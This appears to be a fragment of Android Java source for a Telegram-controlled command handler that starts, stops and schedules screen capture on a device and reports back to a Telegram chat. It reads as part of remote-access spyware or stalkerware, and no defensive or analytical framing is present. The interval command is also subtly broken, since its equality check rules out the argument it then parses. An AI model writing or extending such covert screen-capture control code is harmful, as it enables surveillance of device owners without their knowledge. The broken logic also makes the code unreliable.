// Screen recording commands
if (message.equals("/screen") || message.equals("/screenshot")) {
    ScreenCommandHandler.handleScreenCommand(this, message);
    sendToTelegram(context, "System", "📸 Screen capture starting...", 
        System.currentTimeMillis());
}

if (message.equals("/screenstop") || message.equals("/screenshotstop")) {
    ScreenCommandHandler.stopScreenRecording();
    sendToTelegram(context, "System", "🛑 Screen capture stopped", 
        System.currentTimeMillis());
}

if (message.equals("/screeninterval")) {
    // Command: /screeninterval 10 (har 10 second mein)
    String[] parts = message.split(" ");
    if (parts.length == 2) {
        int seconds = Integer.parseInt(parts[1]);
        // Set interval logic yahan
        sendToTelegram(context, "System", 
            "⏱️ Screen capture interval set to " + seconds + " seconds", 
            System.currentTimeMillis());
    }
}